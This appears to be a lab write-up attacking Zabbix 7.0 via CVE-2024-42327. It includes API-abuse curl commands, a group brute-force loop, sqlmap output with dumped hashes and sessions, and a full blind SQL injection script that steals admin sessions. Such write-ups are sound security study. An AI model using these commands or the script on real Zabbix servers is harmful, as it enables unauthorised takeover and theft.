---
sticker: emoji//1f634
---

# Unrested

## ENUMERATION

***

### OPEN PORTS

***

| PORT  | SERVICE            |
| ----- | ------------------ |
| 22    | ssh                |
| 80    | http               |
| 10050 | tcpwrapped         |
| 10051 | ssl/zabbix-trapper |

## RECONNAISSANCE

***

We can start by going into the web application, let's log in with the following credentials:

```ad-note
`matthew` / `96qzn0h2e1k3`
```

![](gitbook/cybersecurity/images/Pasted%20image%2020250221173745.png)

We are dealing with `Zabbix`, Zabbix is an **open-source monitoring solution** designed to track the performance, availability, and health of IT infrastructure, services, and applications in real time. It is widely used by organizations to ensure their systems run smoothly and to proactively detect issues before they impact users.

Now, already knowing what we're dealing with, let's take a look around the application:

![](gitbook/cybersecurity/images/Pasted%20image%2020250221174100.png)

First, we can see the version of the Zabbix running on the web application, let's search for any kind of exploit regarding `Zabbix 7.0`

![](gitbook/cybersecurity/images/Pasted%20image%2020250221174148.png)

We found an `SQLI`, the `CVE-2024-42327`:

![](gitbook/cybersecurity/images/Pasted%20image%2020250221174245.png)

This is a critical vulnerability, let's start the exploitation process.

## EXPLOITATION

***

Once knowing we're dealing with `CVE-2024-42327`, let's try to exploit it:

```
git clone https://github.com/aramosf/cve-2024-42327/
```

We can use this PoC to check if the Zabbix is vulnerable, it retrieves data from other users:

```
python3 cve-2024-42327.py -u http://10.10.11.50/zabbix/api_jsonrpc.php -n matthew -p 96qzn0h2e1k3

Valid session token: 062cf49c33768876fee4241348f7bf9d
```

It retrieved data, let's go further, we need to reproduce the following steps:

![](gitbook/cybersecurity/images/Pasted%20image%2020250221175827.png)

Let's begin by creating an API token:

![](gitbook/cybersecurity/images/Pasted%20image%2020250221175915.png)

![](gitbook/cybersecurity/images/Pasted%20image%2020250221175924.png)

Our generated API token is:

```
acd87cfdc51fc832b066a4d3beebf72d30d88e64404c0972374502fbd41407dd
```

Now, knowing the endpoint of the application is `/api_jsonrc.php`, we can use curl to make a call and check the behavior of the API:

```bash
curl -X POST --url http://10.10.11.50/zabbix/api_jsonrpc.php --header 'Content-Type: application/json-rpc' --data '{"jsonrpc": "2.0", "method":"user.get", "params":{"output": "extend"},"auth":"acd87cfdc51fc832b066a4d3beebf72d30d88e64404c0972374502fbd41407dd", "id": 1}' -s | jq 
```

We get this output:

```json
{
  "jsonrpc": "2.0",
  "result": [],
  "id": 1
}
```

Now, we are indeed able to interact with the API, let's try changing our username taking advantage of `user.update`, for this, we need to check our user ID, let's use `user.checkAuthentication`:

```bash
curl -X POST --url http://10.10.11.50/zabbix/api_jsonrpc.php --header 'Content-Type: application/json-rpc' --data '{"jsonrpc": "2.0", "method":"user.checkAuthentication", "params":{"token": "acd87cfdc51fc832b066a4d3beebf72d30d88e64404c0972374502fbd41407dd"}, "id": 1}' -s | jq
```

We get this:

```json
{
  "jsonrpc": "2.0",
  "result": {
    "userid": "3",
    "username": "matthew",
    "name": "Matthew",
    "surname": "Smith",
    "url": "",
    "autologin": "1",
    "autologout": "0",
    "lang": "en_US",
    "refresh": "30s",
    "theme": "default",
    "attempt_failed": "0",
    "attempt_ip": "",
    "attempt_clock": "0",
    "rows_per_page": "50",
    "timezone": "system",
    "roleid": "1",
    "userdirectoryid": "0",
    "ts_provisioned": "0",
    "debug_mode": 0,
    "deprovisioned": false,
    "gui_access": 0,
    "mfaid": 0,
    "auth_type": 0,
    "type": 1,
    "userip": "10.10.14.235"
  },
  "id": 1
}
```

Now, we checked we are `id=3`, now let's use `user.update`:

```bash
curl -X POST --url http://10.10.11.50/zabbix/api_jsonrpc.php --header 'Content-Type: application/json-rpc' --data '{"jsonrpc": "2.0", "method":"user.update", "params":{"userid": "3", "name": "pwned"},"auth":"acd87cfdc51fc832b066a4d3beebf72d30d88e64404c0972374502fbd41407dd", "id": 1}' -s | jq
```

And we can check if our username changed:

```bash
curl -s -X POST --url http://10.10.11.50/zabbix/api_jsonrpc.php --header 'Content-Type: application/json-rpc' --data '{"jsonrpc": "2.0", "method":"user.checkAuthentication", "params":{"token": "acd87cfdc51fc832b066a4d3beebf72d30d88e64404c0972374502fbd41407dd"}, "id": 1}' | jq -r '.result.name'
```

We get this:

```
pwned
```

So, it worked, we are able to interact with the API and change stuff in it, let's try to abuse `Broken Access Control` to change our `roleid` to the admin one, which must be `roleid=0`:

```bash
curl -X POST --url http://10.10.11.50/zabbix/api_jsonrpc.php --header 'Content-Type: application/json-rpc' --data '{"jsonrpc": "2.0", "method":"user.update", "params":{"userid": "3", "roleid": "0"},"auth":"acd87cfdc51fc832b066a4d3beebf72d30d88e64404c0972374502fbd41407dd", "id": 1}' -s | jq
```

We get the following:

```json
{
  "jsonrpc": "2.0",
  "error": {
    "code": -32602,
    "message": "Invalid params.",
    "data": "User cannot change own role."
  },
  "id": 1
}
```

It seems like there's some sort of method to prevent users from changing their own role, here's the way to break this, first, we need to find some way to add ourselves into the admin group, for this, we need to exploit the `usrgprps` parameter, in this case, let's use some brute force in order to add ourselves into as many groups as possible:

```bash
for i in {0..50}; do response=$(curl -s -X POST --url http://10.10.11.50/zabbix/api_jsonrpc.php --header 'Content-Type: application/json-rpc' --data "{\"jsonrpc\": \"2.0\", \"method\":\"user.update\", \"params\":{\"usrgrps\": [{\"usrgrpid\": $i}], \"userid\": \"3\"},\"auth\":\"acd87cfdc51fc832b066a4d3beebf72d30d88e64404c0972374502fbd41407dd\", \"id\": 3}"); [[ $response != *\"error\"* ]] && echo "Group ID: $i"; done
```

We get the following output:

```
Group ID: 7
Group ID: 8
Group ID: 11
Group ID: 13
```

And now, we can check our groups:

```bash
curl -s -X POST --url http://10.10.11.50/zabbix/api_jsonrpc.php --header 'Content-Type: application/json-rpc' --data '{"jsonrpc": "2.0", "method":"usergroup.get", "params": {"output": "extend", "status": 0}, "auth":"acd87cfdc51fc832b066a4d3beebf72d30d88e64404c0972374502fbd41407dd", "id": 1}' | jq
```

We get this:

```json
{
  "jsonrpc": "2.0",
  "result": [
    {
      "usrgrpid": "13",
      "name": "Internal",
      "gui_access": "1",
      "users_status": "0",
      "debug_mode": "0",
      "userdirectoryid": "0",
      "mfa_status": "0",
      "mfaid": "0"
    }
  ],
  "id": 1
}
```

As seen `usergprid` has changed to `13`, we can even check zabbix users now:

```bash
curl -s -X POST --url http://10.10.11.50/zabbix/api_jsonrpc.php --header 'Content-Type: application/json-rpc' --data '{"jsonrpc": "2.0", "method":"user.get", "params":{"output": "extend"},"auth":"acd87cfdc51fc832b066a4d3beebf72d30d88e64404c0972374502fbd41407dd", "id": 1}' | jq
```

```json
{
  "jsonrpc": "2.0",
  "result": [
    {
      "userid": "1",
      "username": "Admin",
      "name": "Zabbix",
      "surname": "Administrator",
      "url": "",
      "autologin": "1",
      "autologout": "0",
      "lang": "default",
      "refresh": "30s",
      "theme": "default",
      "attempt_failed": "0",
      "attempt_ip": "",
      "attempt_clock": "0",
      "rows_per_page": "50",
      "timezone": "default",
      "roleid": "3",
      "userdirectoryid": "0",
      "ts_provisioned": "0"
    },
    {
      "userid": "2",
      "username": "guest",
      "name": "",
      "surname": "",
      "url": "",
      "autologin": "0",
      "autologout": "15m",
      "lang": "default",
      "refresh": "30s",
      "theme": "default",
      "attempt_failed": "0",
      "attempt_ip": "",
      "attempt_clock": "0",
      "rows_per_page": "50",
      "timezone": "default",
      "roleid": "4",
      "userdirectoryid": "0",
      "ts_provisioned": "0"
    },
    {
      "userid": "3",
      "username": "matthew",
      "name": "pwned",
      "surname": "Smith",
      "url": "",
      "autologin": "1",
      "autologout": "0",
      "lang": "default",
      "refresh": "30s",
      "theme": "default",
      "attempt_failed": "0",
      "attempt_ip": "",
      "attempt_clock": "0",
      "rows_per_page": "50",
      "timezone": "default",
      "roleid": "1",
      "userdirectoryid": "0",
      "ts_provisioned": "0"
    }
  ],
  "id": 1
}
```

Nice, now we can go back to our script and execute it again:

```python
python3 cve-2024-42327.py -u http://10.10.11.50/zabbix/api_jsonrpc.php -n matthew -p 96qzn0h2e1k3

Valid session token: e5d79f33dd07b844264cb28e5acd082c
Admin, Zabbix, Administrator, 1, $2y$10$L8UqvYPqu6d7c8NeChnxWe1.w6ycyBERr8UgeUYh.3AO7ps3zer2a
guest, , , 2, $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06
matthew, pwned, Smith, 3, $2y$10$e2IsM6YkVvyLX43W5CVhxeA46ChWOUNRzSdIyVzKhRTK00eGq4SwS
```

I tried cracking the hashes but there was no luck with it, that's when i remembered this was vulnerable to SQLI, we can use sqlmap in the following way, let's begin by checking the code:

![](gitbook/cybersecurity/images/Pasted%20image%2020250221182315.png)

We can add this into the code:

```
proxies={
    "http":"127.0.0.1:8080",
    "https":"127.0.0.1:8080"})
```

Now, our requests will go through our burp suite, let's check it out:

![](gitbook/cybersecurity/images/Pasted%20image%2020250221182530.png)

We can modify the request like this and submit it to sqlmap:

![](gitbook/cybersecurity/images/Pasted%20image%2020250221182644.png)

```bash
sqlmap -r req
```

After the process is done, we get this:

```ad-important
| userid | sessionid                        | secret                           | status | lastaccess |
|--------|----------------------------------|----------------------------------|--------|------------|
| 1      | 836881b5a680d319ba5337d127c7f393 | a7885b2b6bdf9f0ae421c7b22f44db95 | 0      | 1733449909 |
| 3      | 643f5420d1bfecca5a1a3fb4ec4f03d4 | bd8e3e2234fee0c576ec88f8b3e988fd | 0      | 1733450199 |
```

If we change the session

## PRIVILEGE ESCALATION

***

```
import requests
import json
from datetime import datetime
import string
import random
import sys
from concurrent.futures import ThreadPoolExecutor

URL = "http://10.129.231.176/zabbix/api_jsonrpc.php"
TRUE_TIME = 1
ROW = 0
USERNAME = "matthew"
PASSWORD = "96qzn0h2e1k3"

def authenticate():
    payload = {
        "jsonrpc": "2.0",
        "method": "user.login",
        "params": {
            "username": f"{USERNAME}",
            "password": f"{PASSWORD}"
        },
        "id": 1
    }
    response = requests.post(URL, json=payload)
    if response.status_code == 200:
        try:
            response_json = response.json()
            auth_token = response_json.get("result")
            if auth_token:
                print(f"Login successful! Auth token: {auth_token}")
                return auth_token
            else:
                print(f"Login failed. Response: {response_json}")
        except Exception as e:
            print(f"Error: {str(e)}")
    else:
        print(f"HTTP request failed with status code {response.status_code}")

def send_injection(auth_token, position, char):
    payload = {
        "jsonrpc": "2.0",
        "method": "user.get",
        "params": {
            "output": ["userid", "username"],
            "selectRole": [
                "roleid",
                (
                    f"name AND (SELECT * FROM (SELECT(SLEEP({TRUE_TIME}-"
                    f"(IF(ORD(MID((SELECT sessionid FROM zabbix.sessions WHERE userid=1 and status=0 "
                    f"LIMIT {ROW},1), {position}, 1))={ord(char)}, 0, {TRUE_TIME})))))BEEF)"
                )
            ],
            "editable": 1,
        },
        "auth": f"{auth_token}",
        "id": 1
    }
    before_query = datetime.now().timestamp()
    response = requests.post(URL, json=payload)
    after_query = datetime.now().timestamp()
    response_time = after_query - before_query
    return char, response_time

def test_characters_parallel(auth_token, position):
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(send_injection, auth_token, position, char): char
            for char in string.printable
        }
        for future in futures:
            char, response_time = future.result()
            if TRUE_TIME - 0.5 < response_time < TRUE_TIME + 0.5:
                return char
    return None

def print_progress(extracted_value):
    sys.stdout.write(f"\rExtracting admin session: {extracted_value}")
    sys.stdout.flush()

def extract_admin_session_parallel(auth_token):
    extracted_value = ""
    max_length = 32
    for position in range(1, max_length + 1):
        char = test_characters_parallel(auth_token, position)
        if char:
            extracted_value += char
            print_progress(extracted_value)
        else:
            print(f"\n(-) No character found at position {position}, stopping.")
            break
    return extracted_value

if __name__ == "__main__":
    print("Authenticating...")
    auth_token = authenticate()
    print("Starting data extraction...")
    admin_session = extract_admin_session_parallel(auth_token)
```
